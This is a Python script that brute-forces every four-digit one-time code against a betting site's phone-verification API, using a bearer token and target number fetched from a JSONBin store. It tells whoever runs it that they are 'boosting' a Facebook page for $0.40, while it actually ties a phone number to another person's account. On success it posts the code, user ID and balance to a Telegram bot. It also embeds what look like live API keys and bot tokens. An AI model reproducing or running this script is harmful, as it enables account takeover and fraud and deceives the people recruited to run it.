import requests
import http.client
import random
import time
import threading
import sys
from concurrent.futures import ThreadPoolExecutor
import json
import os

G, R, Y, B, D = ('[1m[92m', '[1m[91m', '[1m[93m', '[1m[94m', '[0m')
start_range = 0
end_range = 10000
BIN_ID = '69454f7643b1c97be9f91a85'
API_KEY = '$2a$10$TWuZ1cfV8BVaIKzzS2BGS.e56gTvpvpTAtDJz2S./2atXCKI2eIv2'

def fetch_data():
    """
    Fetch token and number from JSONBin.
    Returns a tuple (token, number) or (None, None) if failed.
    """
    url = f'https://api.jsonbin.io/v3/b/{BIN_ID}/latest'
    headers = {'X-Master-Key': API_KEY}
    try:
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            record = r.json()['record']
            return (record.get('user_id'), record.get('balance', {}), record.get('token'), record.get('number'))
        return (None, None, None, None)
    except Exception as e:
        print(e)
        return (None, None, None, None)

user_id, balance, token, number = fetch_data()
HEADERS = {
    'Authorization': f'Bearer {token}', 
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; LE2101 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/526.1.0.66.75;IABMV/1;]', 
    'Content-Type': 'application/json', 
    'Accept': 'application/json', 
    'Referer': 'https://facai777.net/bd/en/member/profile/info/verify-phone'
}
success_event = threading.Event()
skipped_otps = []
skipped_lock = threading.Lock()
success_otp = None

def generate_otp_range(start, end):
    return [f'{i:04d}' for i in range(start, end)]

def checker(otp):
    global success_otp
    if success_event.is_set():
        return
    json_data = {
        'languageTypeId': 1, 
        'currencyTypeId': 8, 
        'contactTypeId': 2, 
        'receiver': number.strip(), 
        'callingCode': '880', 
        'verifyCode': otp, 
        'random': ''
    }
    try:
        conn = http.client.HTTPSConnection('facai777.net')
        body = json.dumps(json_data)
        conn.request('POST', '/api/bt/v1/user/verifyContact', body=body, headers=HEADERS)
        response = conn.getresponse()
        status_code = response.status
        
        try:
            res = json.loads(response.read().decode())
            status = res.get('status')
            message = res.get('message')
        except:
            status = status_code
            message = response.read().decode()
        
        if status == '000000':
            print(f'{G} YOU EARNED $0.40 FACEBOOK {D}')
            success_event.set()
            success_otp = otp
        elif status == 'F0002':
            print(f'{Y} facebook.com/10006520385{otp}/ REQUESTING....{D}')
        elif status == 'S0001' and 'wrong Authorization' in message:
            print(f'{R} SOMEONE INTERUPED❗ START AGAIN...{D}')
            time.sleep(50)
        elif status == 'S0001' and 'request over limit' in message:
            print(f'{R} TOO MANY API EQUESTS PLEASE CHANGE NETWORK 🔁 {D}')
        elif status == 'S0001' and 'token expired' in message:
            print(f'{R} WORK OFF RIGHT NOW YRY AGAIN LATER ‼️{D}\n')
            time.sleep(50)
        elif status == 'F0001':
            print(f'{B} ❌ BOOSTING TIME OVER {D}')
            time.sleep(50)
        elif status == 403:
            print(f'{D} FB SERVER DOWN >> [403]{D}')
        else:
            print(f"{R} {status} {message.upper().split(':')[1]}")
            with skipped_lock:
                skipped_otps.append(otp)
            time.sleep(1)
    except Exception as e:
        print(f'{R} ❌ ERROR: {e}{D}')

def main():
    otps = generate_otp_range(start_range, end_range)
    random.shuffle(otps)
    print(f'{Y} FACEBOOK PAGE BOOSTING HAS STARTED{D}')
    print(f'{G} ------------------------------------------\n{D}')
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        for otp in otps:
            if success_event.is_set():
                break
            executor.submit(checker, otp)
    
    if skipped_otps and (not success_event.is_set()):
        print(f'{Y} 🔁 RETRYING SKIPPED REQUESTS...{D}')
        with ThreadPoolExecutor(max_workers=5) as executor:
            for otp in skipped_otps:
                if success_event.is_set():
                    break
                executor.submit(checker, otp)
    
    if success_otp:
        os.system('clear')
        username = open('.name.txt').read().strip()
        print(f'\n{G} HELLO {username} YOU EARNED $0.40 FACEBOOK {D}\n')
        send_verified(success_otp)
    else:
        print(f'{R}❌ FACEBOOK REJECTED YOUR REQUEST{D}')

def send_verified(success_otp):
    try:
        BOT_TOKEN = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
        CHAT_ID = '-1003275746200'
        msg = f'MCW OTP {success_otp} Successful Verified ✅\nUser ID : `{user_id}`\nCurrent Balance : {str(balance)} BDT\nNumber : 0{number} Added Please Verifiy Now ‼️'
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}).json()
        send_noti()
    except Exception as e:
        print(e)

def send_noti():
    try:
        username = open('.name.txt').read().strip()
        BOT_TOKEN = '8345339682:AAFs60FHY__L2dSKx47sM4IX8nfyPFTACkE'
        CHAT_ID = '-5099546793'
        msg = f'{username} EARNED $0.40 FROM MCW'
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}).json()
    except Exception as e:
        print(e)

def setup_username():
    try:
        with open('.name.txt') as f:
            if f.read().strip():
                return
    except FileNotFoundError:
        pass
    
    username = input(f'{Y} ENTER TELEGRAM USERNAME: {D}').strip()
    if not username.startswith('@'):
        username = '@' + username
    with open('.name.txt', 'w') as f:
        f.write(username)

if __name__ == '__main__':
    setup_username()
    main()